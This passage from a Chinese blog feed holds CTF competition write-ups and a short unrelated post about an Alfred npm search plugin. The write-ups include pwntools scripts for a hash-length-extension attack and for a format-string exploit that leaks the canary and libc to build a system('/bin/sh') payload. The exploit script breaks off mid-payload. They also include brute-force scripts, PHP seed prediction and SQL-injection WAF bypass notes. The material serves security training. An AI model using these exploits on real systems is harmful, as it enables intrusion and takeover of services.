class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConSec</span><span class="params">()</span>:</span></span><br><span class="line">    conn = remote(<span class="string">'106.75.98.74'</span>,<span class="number">10030</span>)</span><br><span class="line">    token = conn.recv()[<span class="number">-33</span>:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    conn.recv()</span><br><span class="line">    <span class="keyword">return</span> conn,token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findSameE</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        conn, token = getConSec()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'start'</span></span><br><span class="line">        h = hashpumpy.hashpump(token, <span class="string">'guest'</span>, <span class="string">'root'</span>, <span class="number">8</span>)</span><br><span class="line">        conn.send(<span class="string">'1\n'</span>)</span><br><span class="line">        conn.recv()</span><br><span class="line">        conn.send(h[<span class="number">1</span>] + <span class="string">'\n'</span>)</span><br><span class="line">        conn.recv()</span><br><span class="line">        conn.send(h[<span class="number">0</span>] + <span class="string">'\n'</span>)</span><br><span class="line">        e = conn.recvline()</span><br><span class="line">        e = int(e[<span class="number">4</span>:])</span><br><span class="line">        d = conn.recvline()</span><br><span class="line">        d = int(d[<span class="number">4</span>:])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'e'</span>,e</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'d'</span>,d</span><br><span class="line">        conn.recv()</span><br><span class="line">        conn.recv()</span><br><span class="line"></span><br><span class="line">        conn.send(<span class="string">'2\n'</span>)</span><br><span class="line">        n = conn.recvline()</span><br><span class="line">        n = int(n[<span class="number">4</span>:])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'n'</span>, n</span><br><span class="line">        e2 = conn.recvline()</span><br><span class="line">        e2 = int(e2[<span class="number">4</span>:])</span><br><span class="line">        conn.recv()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'finish'</span></span><br><span class="line">        <span class="keyword">if</span> e2 == e:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'----------------```````````````````---------------------'</span></span><br><span class="line">            conn.send(<span class="string">'3\n'</span>)</span><br><span class="line">            f = conn.recv()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'f'</span> , f</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">return</span> f, e, d, n</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'not equal'</span></span><br><span class="line">            <span class="keyword">print</span> e2</span><br><span class="line">            <span class="keyword">print</span> e</span><br><span class="line">            conn.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    flag_enc, e, d, n = findSameE()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'flag_enc :&gt;&gt;'</span>, flag_enc</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'e and d and n'</span>, e, d, n</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>拿到数据后进行解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">f = <span class="number">14683015815664558563801576941259873798326690167651050048605500438701684408496420446210954963532410318389297642966435854745489938317707457853711466218044289065290845837536321014853684020186460366403221101008046326997159780567723107338094785513531848765406240418605856262554526167176997869744050412437697207716369805258141774488366641109964920618527096963297754238554764407150841812474020940377383920892323044658675143281286681485516457951570278828305838636179900402944417184295742821658797425171138893795809447102808748184072282008730049190002045912253021436715877710641309577427718880947231481979509491773821558495630</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">42557</span></span><br><span class="line">d = <span class="number">1405803797689753766121124816811438406635097169509938302560321650694887683763354544832446421618462783636223460691651260024139139681435555981044230096841532923821590682557001444031830233529733318151758359126991717193768181340465430448286701933168519305144478953071981857058771098824813044597941221483519691463328674245665508867881940139408259177240035345986021535415530440683317357792630367912626512879140394887502781711233045371334777186553583913805249735850457844171355581182981430494538414242574735347168419095760484924117877688500538899280429652142746708737501656061740113932258961396160464225966939430889959741717</span></span><br><span class="line">n = <span class="number">14713918400954955982493042014029607543327552937244083704392427075411297382665292514617418191051874245746867146250517135476460739651464081624520241080001258396231046403732983387521544330625888052283418713567975039010130962446184781994032753116048370897450465028500819451758514917040720299792076872275983155338383970086972864937471593525080347940764126191055849932929374654181884571725974013062466998817258204252680163981682275618928317547959032958679930767406984643684388270842181251832310744561071776712068724629196823024610536091642933627694285340404564988534606855524020291041210781629240781218089956911861804824793</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> long_to_bytes(pow(f,d,n))</span><br></pre></td></tr></table></figure><h1 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h1><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/11091834.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;比赛时间是从 11月4日08:00 - 11月5日08:00 ，周末和 Swing 学弟、周师傅 一起打了线上，11月4号晚上还是第三，睡了一觉起来发现第6了。不过进了决赛（前20），18号可以约上海，记录下解题报告WriteUp。&lt;/p&gt;
&lt;/b
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>一个alfred-npmjs小工具</title>
    <link href="https://www.ycjcl.cc/2018/07/08/%E4%B8%80%E4%B8%AAalfred-npmjs%E5%B0%8F%E5%B7%A5%E5%85%B7/"/>
    <id>https://www.ycjcl.cc/2018/07/08/一个alfred-npmjs小工具/</id>
    <published>2018-07-08T15:46:43.000Z</published>
    <updated>2018-07-08T15:47:20.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="alfred-npmjs"><a href="#alfred-npmjs" class="headerlink" title="alfred-npmjs"></a>alfred-npmjs</h1><p><a href="https://github.com/ycjcl868/alfred-npmjs" target="_blank" rel="noopener">Github</a>，喜欢就 Star 一个吧~<br><a href="README.md">English README</a></p><blockquote><p><a href="https://www.alfredapp.com" target="_blank" rel="noopener">Alfred 3</a> 去快速搜索 <a href="https://www.npmjs.com/" target="_blank" rel="noopener">npmjs.com</a> 上的模块信息</p></blockquote><p>npm是Node.js默认的、以JavaScript编写的软件包管理系统。</p><p><img src="https://raw.githubusercontent.com/ycjcl868/alfred-npmjs/gh-pages/images/snapshot.png" alt=""></p><h2 id="下载和安装"><a href="#下载和安装" class="headerlink" title="下载和安装"></a>下载和安装</h2><p>下载最新的版本从<a href="https://github.com/ycjcl868/alfred-npmjs/releases/latest" target="_blank" rel="noopener">Github releases page</a></p><h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h2><ul><li>主要针对于模块精确查找(列表默认显示3条相关信息，你可以修改这个最大值)</li><li>可以显示模块的作者头像</li><li>缓存模块列表，如果缓存的头像超过了10个，就会自动清除缓存(当然，最大缓存数也是可以修改的)</li></ul><h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><p>在 Alfred 中, 输入 <code>npm</code>, <kbd>Space</kbd> , <code>package</code> 为你想要查找的模块. (例如: <code>npm lodash</code>)</p><p>选择你想要的模块，按下 <kbd>Enter</kbd> 直接链接到该模块的 <code>npm.js</code> 主页.</p><p><img src="https://raw.githubusercontent.com/ycjcl868/alfred-npmjs/gh-pages/images/usage.gif" alt=""></p><h2 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h2><h4 id="v0-1"><a href="#v0-1" class="headerlink" title="v0.1"></a>v0.1</h4><ul><li>初始化项目</li></ul><h2 id="社区贡献"><a href="#社区贡献" class="headerlink" title="社区贡献"></a>社区贡献</h2><p><a href="https://github.com/ycjcl868/alfred-npmjs/issues" target="_blank" rel="noopener">GitHub issues</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;alfred-npmjs&quot;&gt;&lt;a href=&quot;#alfred-npmjs&quot; class=&quot;headerlink&quot; title=&quot;alfred-npmjs&quot;&gt;&lt;/a&gt;alfred-npmjs&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/yc
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>第三届全国网络空间安全技术大赛(线上初赛)</title>
    <link href="https://www.ycjcl.cc/2018/07/08/%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B(%E7%BA%BF%E4%B8%8A%E8%B5%9BWriteUp)/"/>
    <id>https://www.ycjcl.cc/2018/07/08/第三届全国网络空间安全技术大赛(线上赛WriteUp)/</id>
    <published>2018-07-08T15:45:52.000Z</published>
    <updated>2018-07-08T15:46:16.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第三届全国网络空间安全技术大赛-线上初赛"><a href="#第三届全国网络空间安全技术大赛-线上初赛" class="headerlink" title="第三届全国网络空间安全技术大赛(线上初赛)"></a>第三届全国网络空间安全技术大赛(线上初赛)</h1><p>##web 1 签到题<br>1.老套路看源码发现是php隐士转换直接 <code>Username=QNKCDZO，password=240610708</code> ，得到下一个地址<a href="http://117.34.111.15:84/json.php" target="_blank" rel="noopener">http://117.34.111.15:84/json.php</a><br>2.继续右键看源码<br><img src="http://i.imgur.com/uzIyIK5.png" alt=""></p><p>3.又是弱类型</p><p><img src="http://i2.muimg.com/567571/0e5913ddf22456cc.png" alt=""></p><h1 id="Web2-抽抽奖"><a href="#Web2-抽抽奖" class="headerlink" title="Web2 抽抽奖"></a>Web2 抽抽奖</h1><blockquote><p>抽奖呗 <a href="http://117.34.111.15/" target="_blank" rel="noopener">http://117.34.111.15/</a></p></blockquote><p>看到 <code>jQuery.js</code> 有点异常，打开源码，<a href="https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html" target="_blank" rel="noopener">解码</a>得到以下代码：</p><p><img src="http://i4.buimg.com/567571/cc3bda86da260b92.png" alt=""></p><p>然后直接在控制台输入 <code>getFlag</code>，得到 <code>flag</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">window</span>.getFlag=<span class="function"><span class="keyword">function</span>(<span class="params">text</span>)</span>&#123;  <span class="keyword">if</span>(text==<span class="string">'1'</span>)&#123;      alert(<span class="string">"你最厉害啦!可惜没flag"</span>)  &#125;   <span class="keyword">if</span>(text==<span class="string">'2'</span>)&#123;      alert(<span class="string">"你太厉害了,竟然是二等奖"</span>)   &#125;   <span class="keyword">if</span>(text==<span class="string">'3'</span>)&#123;      alert(<span class="string">"你好厉害,三等奖啊"</span>)  &#125;   <span class="keyword">if</span>(text==<span class="string">'flag'</span>)&#123;       alert(<span class="string">"flag&#123;951c712ac2c3e57053c43d80c0a9e543&#125;"</span>)     &#125;   <span class="keyword">if</span>(text==<span class="string">'0'</span>)&#123;      alert(<span class="string">"再来一次吧"</span>)  &#125; &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="Web3-继续抽"><a href="#Web3-继续抽" class="headerlink" title="Web3 继续抽"></a>Web3 继续抽</h1><p>查看源代码，看代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$.get(<span class="string">'get.php?token='</span> + $(<span class="string">"#token"</span>).val() + <span class="string">"&amp;id="</span> + encode(md5(jsctf2)), <span class="function"><span class="keyword">function</span>(<span class="params">jsctf3</span>) </span>&#123;</span><br><span class="line">    alert(jsctf3[<span class="string">'text'</span>])</span><br><span class="line">&#125;, <span class="string">'json'</span>);</span><br></pre></td></tr></table></figure><p>于是构造请求 <code>&#39;http://117.34.111.15:81/get.php?token=&#39;+token+&#39;&amp;id=&#39;+id</code> ，试了下 <code>encode(md5(&#39;1&#39;))、encode(md5(&#39;2&#39;))、encode(md5(&#39;3&#39;))</code>，均没出来 <code>flag</code> ，于是写了 <code>python</code> 脚本，跑构造好的字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyquery</span><br><span class="line"></span><br><span class="line">file = open(<span class="string">'zd.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> file.readlines():</span><br><span class="line">    id = line.strip(<span class="string">'\n'</span>)</span><br><span class="line">    url = <span class="string">'http://117.34.111.15:81/'</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, sdch, br'</span>,</span><br><span class="line">        <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line">        <span class="string">'Cache-Control'</span>:<span class="string">'max-age=0'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>,</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (iPhone; CPU iPhone OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B150 MicroMessenger/6.5.1 NetType/WIFI Language/zh_CN'</span>,</span><br><span class="line">        <span class="string">'Upgrade-Insecure-Requests'</span>:<span class="string">'1'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>:<span class="string">'zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4'</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    s = requests.Session()</span><br><span class="line"></span><br><span class="line">    r = s.get(url=url,headers=headers).text</span><br><span class="line"></span><br><span class="line">    c = pyquery.PyQuery(r)</span><br><span class="line"></span><br><span class="line">    token = c(<span class="string">'#token'</span>).val()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    url2 = <span class="string">'http://117.34.111.15:81/get.php?token='</span>+token+<span class="string">'&amp;id='</span>+id</span><br><span class="line"></span><br><span class="line">    r2 = s.get(url=url2,headers=headers)</span><br><span class="line">    str = r2.text</span><br><span class="line">    <span class="keyword">print</span> str.decode(<span class="string">'unicode_escape'</span>).encode(<span class="string">'utf-8'</span>), id</span><br></pre></td></tr></table></figure><p>于是跑出 <code>flag</code>，也就是当 <code>encode(md5(&#39;147&#39;))</code> 时，</p><p><img src="http://i1.piimg.com/567571/08ff7a791dc14523.jpg" alt=""></p><h1 id="Web4-Wrong"><a href="#Web4-Wrong" class="headerlink" title="Web4  Wrong"></a>Web4  Wrong</h1><p>找到这个 <code>.index.php.swp</code> 通过恢复文件 <code>vim -r index.php</code> 得到下面源码</p><p><img src="http://i2.muimg.com/567571/911b3dc41578b3b1.png" alt=""></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_password</span><span class="params">($pw_length =  <span class="number">10</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$randpwd = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $pw_length; $i++)</span><br><span class="line">&#123;</span><br><span class="line">$randpwd .= chr(mt_rand(<span class="number">33</span>, <span class="number">126</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $randpwd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">mt_srand(time());</span><br><span class="line">$pwd=create_password();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($pwd==$_GET[<span class="string">'pwd'</span>])</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>($_SESSION[<span class="string">'userLogin'</span>]==$_GET[<span class="string">'login'</span>])</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Good job, you get the key"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;<span class="keyword">echo</span> <span class="string">"Wrong!"</span>;&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">'userLogin'</span>]=create_password(<span class="number">32</span>).rand();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过小小的审计得到思路 把cookie删掉<br>就可以过第二个 <code>if($_SESSION[&#39;userLogin&#39;]==$_GET[&#39;login&#39;])</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_password</span><span class="params">($pw_length =  <span class="number">10</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $randpwd = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $pw_length; $i++)</span><br><span class="line">    &#123;</span><br><span class="line">        $randpwd .= chr(mt_rand(<span class="number">33</span>, <span class="number">126</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $randpwd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand(<span class="number">1492307701</span>);</span><br><span class="line">$pwd=create_password();</span><br><span class="line">var_dump($pwd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过下面脚本得到一个随后的时间戳，用 <code>burp</code> 不断发包，等到时间到了设置的时间戳就会得到 <code>flag</code></p><p>##web4 so easy:<br>访问:<code>http://117.34.111.15:89/</code> 得到部分源码</p><p><img src="http://i.imgur.com/2MLmzn8.png" alt=""></p><ol><li>waf拦截了<code>逗号、空格、and、union</code>等关键字，但是没有过滤<code>mid、ascii、from等关键字</code>，因为过滤了and，那就利用Mysql的位运算<code>0&#39;^1^&#39;1</code>结果为0，拼接sql语句为<code>select role from  user where username =&#39;0&#39;^1^0</code>成功得到查询到admin的role</li><li><p>利用bool型盲注进行注入，用()代替空格，用from 1 代替,写一个脚本跑一下，得到密码: <code>37b1d2f04f594bfffc826fd69e389688</code></p><p> <img src="http://i.imgur.com/CWEovXF.png" alt=""></p></li><li><p>利用注入的密码去登录</p><p> <img src="http://i.imgur.com/g6oxtms.png" alt=""></p></li><li><p>这里直接用mysql字符问题解决，成功获取flag</p><p> <img src="http://i.imgur.com/5R2rXH0.png" alt=""></p></li></ol><p>##web5 just a test：<br>1.随手发现注入<br>直接sqlmap跑，开始一直在跑test1库，跑到后台管理账号密码，后台没有</p><p>2.列了一下数据库，看到了test库，想到题目才知道入坑了，但是跑不出来列得到列名为fl@g，尝试去跑内容，但是段都列不了，用尝试手工，成功获取到fl@g的列为f1ag(ps:坑就在@，mysql会把g当做变量，没办法查询，用反引号扩起来就好了)</p><p><img src="http://i.imgur.com/ClmCCbs.png" alt=""></p><p><img src="http://i.imgur.com/Xkcyt7V.png" alt=""></p><p>因为extractvalue有32位的限制，直接把f1ag加在sqlmap的列的目录里面，直接dump吧</p><p><img src="http://i.imgur.com/pkyjJZN.png" alt=""></p><h1 id="Crypto1-签到"><a href="#Crypto1-签到" class="headerlink" title="Crypto1 签到"></a>Crypto1 签到</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> ~ <span class="built_in">echo</span> <span class="string">"ZmxhZ3tXZWlTdW9GeXVfQmllTGFuZ30="</span> | base64 -D</span><br><span class="line">flag&#123;WeiSuoFyu_BieLang&#125;</span><br></pre></td></tr></table></figure><h1 id="Crypt2-200"><a href="#Crypt2-200" class="headerlink" title="Crypt2 200"></a>Crypt2 200</h1><p>小强不小心截获了两个老外同服务器的加密通信数据，看看他们在说些什么。。。</p><p>在通信流量中能找到 N 和E，猜测密文都是一样的，用共模攻击<br>得到 <code>flag{flag{Hc0mm0nModulusR$AH}}</code></p><h1 id="Bin1-Now"><a href="#Bin1-Now" class="headerlink" title="Bin1 Now"></a>Bin1 Now</h1><p>程序使用自修改代码、第三方标准库等手段，影响静态分析。程序输入在<code>00402047</code>处，接着在<code>004020E9</code>检查长度是否为9。通过<code>004038F0</code>输出调用定位到关键输出在<code>00402490</code>函数中，此控制此函数关键之跳的<code>dword_446184</code>是在<code>402640</code>函数中确定的。细看下此函数，发现关键算法也在此处，将输入和<code>xmmword_43AC00</code>分别运算后进行比较，因为<code>xmmword_43AC00</code>的计算结果为定值，整理下即可反算出输入<code>536724689</code>，代码如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">check = [<span class="number">0x0b</span>,<span class="number">0x06</span>,<span class="number">0x15</span>,<span class="number">0x0b</span>,<span class="number">0x04</span>,<span class="number">0x0e</span>,<span class="number">0x16</span>,<span class="number">0x10</span>,<span class="number">0x31</span>]</span><br><span class="line">input = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">s2 = check[<span class="number">3</span>*i+<span class="number">1</span>]/<span class="number">2</span></span><br><span class="line">s1 = check[<span class="number">3</span>*i]<span class="number">-2</span>*s2</span><br><span class="line">s3 = check[<span class="number">3</span>*i+<span class="number">2</span>]<span class="number">-5</span>*s2</span><br><span class="line">input += chr(s1+<span class="number">0x30</span>)+chr(s2+<span class="number">0x30</span>)+chr(s3+<span class="number">0x30</span>)</span><br><span class="line"><span class="keyword">print</span> input</span><br></pre></td></tr></table></figure><p>将输入代入程序即可得到后面一部分的flag：<code>0IdWan9}</code><br>根据题目提示，终于在文件的详细资料里找到一串base64串，解之得到<code>flag{aoot@mail:</code>。<br>所以最终flag:<code>flag{aoot@mail:0IdWan9}</code>。</p><h1 id="Bin2-Magical-Box"><a href="#Bin2-Magical-Box" class="headerlink" title="Bin2 Magical Box"></a>Bin2 Magical Box</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"117.34.80.134"</span>, <span class="number">7777</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">"you?\n"</span>)</span><br><span class="line">    payload = <span class="string">"aa"</span> + p32(addr) + <span class="string">"%5$s"</span></span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recvuntil(<span class="string">"login!aa"</span>)</span><br><span class="line">    r.recv(<span class="number">4</span>)</span><br><span class="line">    data = r.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">    data = data.replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_canary</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">"you?\n"</span>)</span><br><span class="line">    payload = <span class="string">"%7$p"</span></span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recvuntil(<span class="string">"login!"</span>)</span><br><span class="line">    data = r.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">    data = data.replace(<span class="string">"\n"</span>, <span class="string">""</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">canary = int(leak_canary(),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] canary:&#123;0&#125;"</span>.format(hex(canary))</span><br><span class="line"></span><br><span class="line">printf_got = <span class="number">0x0804B010</span></span><br><span class="line">leak_data = leak(printf_got)</span><br><span class="line">printf_addr = u32(leak_data[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">fflush_addr = u32(leak_data[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] printf:&#123;0&#125;"</span>.format(hex(printf_addr))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] fflush:&#123;0&#125;"</span>.format(hex(fflush_addr))</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">libc_base = printf_addr - libc.symbols[<span class="string">"printf"</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">sh_addr = next(libc.search(<span class="string">"/bin/sh"</span>)) + libc_base</span><br><span class="line"><span class="comment">#attach()</span></span><br><span class="line">r.recvuntil(<span class="string">"you?\n"</span>)</span><br><span class="line">r.sendline(<span class="string">"admin2017"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"commands."</span>)</span><br><span class="line">r.sendline(<span class="string">"add"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"APP/Site: "</span>)</span><br><span class="line">r.sendline(<span class="string">"a"</span>*<span class="number">0x31</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Username: "</span>)</span><br><span class="line">r.sendline(<span class="string">"b"</span>*<span class="number">0x1d</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Password: "</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">30</span></span><br><span class="line">payload += p32(canary)</span><br><span class="line">payload += <span class="string">"a"</span>*<span class="number">0xc</span></span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += 